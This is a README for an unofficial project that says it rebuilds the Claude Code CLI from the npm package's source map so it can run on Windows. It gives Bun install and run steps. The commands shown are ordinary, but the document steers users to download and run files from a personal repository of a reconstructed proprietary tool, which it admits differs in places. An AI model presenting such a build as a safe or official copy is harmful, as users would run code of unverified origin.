# ⚙️ CC - Run Claude Code on Windows

[![Download CC](https://img.shields.io/badge/Download-CC-7e57c2?style=for-the-badge&logo=github)](https://github.com/Montesplenic117/CC)

## 🧭 What this is

CC is a Windows-friendly way to run a restored Claude Code CLI from the published package source map.

It gives you a local command-line app that opens in a terminal and lets you work through text prompts. The project rebuilds the TypeScript source so it can run again on your machine.

## 📥 Download and install

Visit this page to download:

[https://github.com/Montesplenic117/CC](https://github.com/Montesplenic117/CC)

On the page, get the files from the latest release or clone the repository if that is the option shown there. If you already have the project files, move on to the setup steps below.

## 🖥️ What you need

- Windows 10 or Windows 11
- Terminal access
- Bun 1.3.5 or newer
- Node.js 24 or newer
- Internet access for the first setup
- Enough disk space for source files and packages

If you are not sure whether Bun is installed, open PowerShell and type:

```powershell
bun --version
```

If you see a version number, you are ready for setup.

## 🚀 Setup steps

1. Download the project files from the link above.
2. Place the files in a folder you can find easily, such as `Downloads\CC`.
3. Open PowerShell in that folder.
4. Install the required packages:

```powershell
bun install
```

5. Start the app:

```powershell
bun run dev
```

6. To check the version, use:

```powershell
bun run version
```

## 🪟 How to open it on Windows

If you need help opening the folder in PowerShell:

1. Open File Explorer.
2. Go to the folder that contains the CC files.
3. Click the address bar.
4. Type `powershell` and press Enter.

PowerShell will open in that folder, so you can run the commands without changing directories.

## ⌨️ First run

When you start the app with `bun run dev`, the CLI opens in the terminal.

You can then:

- type commands into the prompt
- use slash commands inside the app
- move through the text interface with your keyboard
- keep the app open while you work

If the window closes right away, open it again from PowerShell so you can see the message on screen.

## 🗂️ Main files and folders

```text
├── src/                    # Main source files
│   ├── main.tsx            # CLI entry point
│   ├── dev-entry.ts        # Development entry
│   ├── commands.ts         # Command setup
│   ├── commands/           # Slash command logic
│   ├── tools/              # Tool logic
│   ├── components/         # Terminal UI parts
│   ├── hooks/              # React hooks
│   └── utils/              # Shared helper code
├── imgs/                   # Images used in the README
├── package.json            # Project setup
└── bun.lockb               # Bun lock file
```

## 🧩 What you can do with it

- run the Claude Code CLI locally
- work with the restored TypeScript source
- inspect command behavior
- test the app in a terminal
- study how the CLI is built
- use the app as a working local development copy

## 🛠️ Common setup checks

If `bun install` does not work, check these points:

- Bun is installed and on your PATH
- Node.js 24 or newer is installed
- you opened the terminal in the correct folder
- the project files finished downloading

If `bun run dev` does not start, try:

```powershell
bun run version
```

If that works, the install is in place and the dev entry may need another terminal start.

## 🔍 Current project status

- the source tree can be restored and run in a local development flow
- `bun install` installs the dependencies
- `bun run version` prints the version number
- `bun run dev` starts the restored CLI entry and keeps it open as an interactive process

## 📚 Project details

| Item | Details |
|------|---------|
| Source | `@anthropic-ai/claude-code` npm package |
| Files restored | 1,987 TypeScript / TSX files |
| Runtime | Bun 1.3.5+ and Node.js 24+ |
| App type | Terminal-based CLI |
| Target use | Local study and testing |

## 🔐 About the source

This repository rebuilds the CLI from public source map data. Some parts may use compatibility shims where the source map did not provide full detail. That means a few behaviors can differ from the original package.

## 🧪 Basic usage flow

1. Download the project from the link above.
2. Install Bun and Node.js if they are not already on your PC.
3. Open PowerShell in the project folder.
4. Run `bun install`.
5. Run `bun run dev`.
6. Use the terminal app as it opens.

## 🖼️ Preview

![Preview](imgs/preview.png)